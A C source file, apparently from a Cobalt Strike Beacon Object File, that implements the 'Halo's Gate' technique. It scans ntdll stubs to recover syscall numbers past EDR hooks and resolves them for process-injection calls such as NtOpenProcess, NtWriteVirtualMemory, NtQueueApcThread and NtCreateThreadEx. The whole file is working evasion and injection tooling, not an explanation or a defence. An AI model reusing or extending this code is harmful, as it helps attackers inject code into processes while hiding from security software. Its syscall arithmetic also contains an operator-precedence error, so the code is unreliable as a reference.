#include <windows.h>

#include "Ntdll.h"
#include "Syscalls.h"
#include "Bofdefs.h"
#include "Beacon.h"

#define DOWN	32

BOOL HalosGate(
	_In_	PVOID	pFunctionAddr,
	_Inout_	PDWORD	dwSyscall,
	_Inout_	PVOID* pJmpAddr
)
{


	if (
		*(PBYTE)((PBYTE)pFunctionAddr) == 0x4C &&
		*(PBYTE)((PBYTE)pFunctionAddr + 1) == 0x8B &&
		*(PBYTE)((PBYTE)pFunctionAddr + 2) == 0xD1 &&
		*(PBYTE)((PBYTE)pFunctionAddr + 3) == 0xB8 &&
		*(PBYTE)((PBYTE)pFunctionAddr + 6) == 0x00 &&
		*(PBYTE)((PBYTE)pFunctionAddr + 7) == 0x00
		)
	{
		// Function not hooked
		BYTE high = *((PBYTE)pFunctionAddr + 5);
		BYTE low = *((PBYTE)pFunctionAddr + 4);
		*dwSyscall = (high << 8) | low;
		*pJmpAddr = ((PBYTE)pFunctionAddr + 0x12);

		return TRUE;
	}
	else
	{
		for (int i = 1; i < 500; i++)
		{
			if (
				*(PBYTE)((PBYTE)pFunctionAddr + i * DOWN) == 0x4C &&
				*(PBYTE)((PBYTE)pFunctionAddr + 1 + i * DOWN) == 0x8B &&
				*(PBYTE)((PBYTE)pFunctionAddr + 2 + i * DOWN) == 0xD1 &&
				*(PBYTE)((PBYTE)pFunctionAddr + 3 + i * DOWN) == 0xB8 &&
				*(PBYTE)((PBYTE)pFunctionAddr + 6 + i * DOWN) == 0x00 &&
				*(PBYTE)((PBYTE)pFunctionAddr + 7 + i * DOWN) == 0x00
				)
			{
				BYTE high = *((PBYTE)pFunctionAddr + 5 + i * DOWN);
				BYTE low = *((PBYTE)pFunctionAddr + 4 + i * DOWN);
				*dwSyscall = (high << 8) | low - i;
				*pJmpAddr = ((PBYTE)pFunctionAddr + 0x12);

				return TRUE;
			}
		}
	}


	return FALSE;
}



BOOL InitNtFunc(
    _In_    PNT_FUNC    NtFunc
)
{
    HMODULE hModNtdll = GetModuleHandleA("Ntdll.dll");
    if (!hModNtdll)
        return FALSE;

	if (!HalosGate(GetProcAddress(hModNtdll, "NtOpenProcess"), &NtFunc->NtOpenProcess.wSyscall, &NtFunc->NtOpenProcess.pJmpAddr))
		return FALSE;

	if (!HalosGate(GetProcAddress(hModNtdll, "NtAllocateVirtualMemory"), &NtFunc->NtAllocateVirtualMemory.wSyscall, &NtFunc->NtAllocateVirtualMemory.pJmpAddr))
		return FALSE;

	if (!HalosGate(GetProcAddress(hModNtdll, "NtWriteVirtualMemory"), &NtFunc->NtWriteVirtualMemory.wSyscall, &NtFunc->NtWriteVirtualMemory.pJmpAddr))
		return FALSE;

	if (!HalosGate(GetProcAddress(hModNtdll, "NtGetContextThread"), &NtFunc->NtGetContextThread.wSyscall, &NtFunc->NtGetContextThread.pJmpAddr))
		return FALSE;

	if (!HalosGate(GetProcAddress(hModNtdll, "NtSetContextThread"), &NtFunc->NtSetContextThread.wSyscall, &NtFunc->NtSetContextThread.pJmpAddr))
		return FALSE;

	if (!HalosGate(GetProcAddress(hModNtdll, "NtResumeThread"), &NtFunc->NtResumeThread.wSyscall, &NtFunc->NtResumeThread.pJmpAddr))
		return FALSE;

	if (!HalosGate(GetProcAddress(hModNtdll, "NtQueueApcThread"), &NtFunc->NtQueueApcThread.wSyscall, &NtFunc->NtQueueApcThread.pJmpAddr))
			return FALSE;

	if (!HalosGate(GetProcAddress(hModNtdll, "NtClose"), &NtFunc->NtClose.wSyscall, &NtFunc->NtClose.pJmpAddr))
		return FALSE;

	if (!HalosGate(GetProcAddress(hModNtdll, "NtProtectVirtualMemory"), &NtFunc->NtProtectVirtualMemory.wSyscall, &NtFunc->NtProtectVirtualMemory.pJmpAddr))
		return FALSE;

	if (!HalosGate(GetProcAddress(hModNtdll, "NtCreateThreadEx"), &NtFunc->NtCreateThreadEx.wSyscall, &NtFunc->NtCreateThreadEx.pJmpAddr))
		return FALSE;


	return TRUE;
}